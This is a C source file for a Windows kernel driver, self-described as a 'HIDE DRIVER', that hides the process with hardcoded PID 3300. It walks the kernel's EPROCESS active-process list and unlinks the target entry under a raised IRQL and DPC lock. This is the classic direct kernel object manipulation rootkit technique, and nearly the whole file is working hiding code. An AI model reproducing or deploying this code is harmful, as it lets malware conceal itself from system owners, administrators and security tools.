#include "hidedriver.h"

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	pDriverObject->DriverUnload = UnloadDriver;
	DebugMessage("Welcome to the first HIDE DRIVER!\n");

	DWORD a = 3300;
	HideTask(&a);
	return STATUS_SUCCESS;
}

NTSTATUS UnloadDriver(PDRIVER_OBJECT pDriveObject)
{
	DebugMessage("HIDE DRIVER SAYS GOODBYE!\n");
	return STATUS_SUCCESS;
}

BYTE* getNextPEP(BYTE* currentPEP)
{
	BYTE* nextPEP = NULL;
	BYTE* fLink = NULL;
	LIST_ENTRY listEntry;

	listEntry = *((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	fLink = (BYTE*)(listEntry.Flink);
	nextPEP = (fLink - EPROCESS_OFFSET_LINKS);
	return nextPEP;
}

BYTE* getPreviousPEP(BYTE* currentPEP)
{
	BYTE* prevPEP = NULL;
	BYTE* bLink = NULL;
	LIST_ENTRY listEntry;
	listEntry = *((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	bLink = (BYTE*)(listEntry.Blink);
	prevPEP = (bLink - EPROCESS_OFFSET_LINKS);
	return prevPEP;
}

void getTaskName(BYTE* dest, BYTE* src)		//BYTE* == char*
{
	strncpy((char*)dest, (char*)src, SZ_EPROCESS_NAME);
	dest[SZ_EPROCESS_NAME - 1] = '\0';
	return;
}

int getPID(BYTE* currentPEP)
{
	int* pid;
	pid = (int*)(currentPEP + EPROCESS_OFFSET_PID);
	return *pid;
}

void printNameInHex(BYTE* src)
{
	int i;
	DBG_PRINT1("        ");
	for (i = 0; i < SZ_EPROCESS_NAME; i++)
	{
		DBG_PRINT2("[%02x]", src[i]);
	}
	return;
}

void modifyTaskListEntry(UCHAR* currentPEP)
{
	BYTE* prevPEP = NULL;
	BYTE* nextPEP = NULL;

	int currentPID = 0;

	int prevPID = 0;
	int nextPID = 0;

	BYTE currentName[SZ_EPROCESS_NAME];
	BYTE prevName[SZ_EPROCESS_NAME];
	BYTE nextName[SZ_EPROCESS_NAME];

	LIST_ENTRY* currentListEntry;
	LIST_ENTRY* prevListEntry;
	LIST_ENTRY* nextListEntry;

	currentPID = getPID(currentPEP);
	getTaskName(currentName, (currentPEP + EPROCESS_OFFSET_NAME));
	DBG_PRINT3("modifyTaskListEntry: Current is %s[PID=%d]\n", currentName, currentPID);

	prevPEP = getPreviousPEP(currentPEP);
	prevPID = getPID(prevPEP);
	getTaskName(prevName, (prevPEP + EPROCESS_OFFSET_NAME));
	DBG_PRINT3("modifyTaskListEntry: Prev is %s[PID=%d]\n", prevName, prevPID);

	nextPEP = getNextPEP(currentPEP);
	nextPID = getPID(nextPEP);
	getTaskName(nextName, (nextPEP + EPROCESS_OFFSET_NAME));
	DBG_PRINT3("modifyTaskListEntry: Next is %s[PID=%d]\n", nextName, nextPID);

	currentListEntry = ((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY*)(prevPEP + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY*)(nextPEP + EPROCESS_OFFSET_LINKS));

	DBG_PRINT3("modifyTaskListEntry: removing %s[PID=%d]\n", currentName, currentPID);
	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

	(*currentListEntry).Flink = currentListEntry;
	(*currentListEntry).Blink = currentListEntry;
	return;
}

void modifyTaskList(DWORD pid)
{
	BYTE* currentPEP = NULL;
	BYTE* nextPEP = NULL;
	DWORD currentPID = 0;
	DWORD startPID = 0;
	BYTE name[SZ_EPROCESS_NAME];

	int fuse = 0;
	const int BLOWN = 1048576;

	currentPEP = (UCHAR*)PsGetCurrentProcess();
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));

	DBG_PRINT1("modifyTaskList: Search[Begin]\n");
	startPID = currentPID;

	DBG_PRINT3("    %s [PID(%d)]:\n", name, currentPID);
	if (currentPID == pid)
	{
		modifyTaskListEntry(currentPEP);
		DBG_PRINT2("modifyTaskList: Search[Done] PID=%d Hidden\n", pid);
		return;
	}

	nextPEP = getNextPEP(currentPEP);
	currentPEP = nextPEP;
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));

	while (startPID != currentPID)
	{
		DBG_PRINT3("    %s [PID(%d)]:\n", name, currentPID);
		if (currentPID == pid)
		{
			modifyTaskListEntry(currentPEP);
			DBG_PRINT2("modifyTaskList: Search[Done] PID=%d Hidden\n", pid);
			return;
		}

		nextPEP = getNextPEP(currentPEP);
		currentPEP = nextPEP;
		currentPID = getPID(currentPEP);
		getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
		fuse++;
		if (fuse == BLOWN)
		{
			DBG_TRACE("ListTasks", "--POP!--... You blew a fuse");
			return;
		}
	}
	DBG_PRINT2("    %d Tasks Listed\n", fuse);
	DBG_PRINT2("modifyTaskList: Search[Done]...No task found with PID=%d\n", pid);
	return;
}

void HideTask(DWORD* pid)
{
	DebugMessage("Entering HideTask()\n");
	KIRQL irql;
	PKDPC dpcPtr;

	DBG_PRINT2("HideTask: hiding PID[%d]\n", *pid);

	irql = RaiseIRQL();
	dpcPtr = AcquireLock();

	modifyTaskList(*pid);

	ReleaseLock(dpcPtr);
	LowerIRQL(irql);
	DebugMessage("Leaving HideTask()\n");
	return;
}
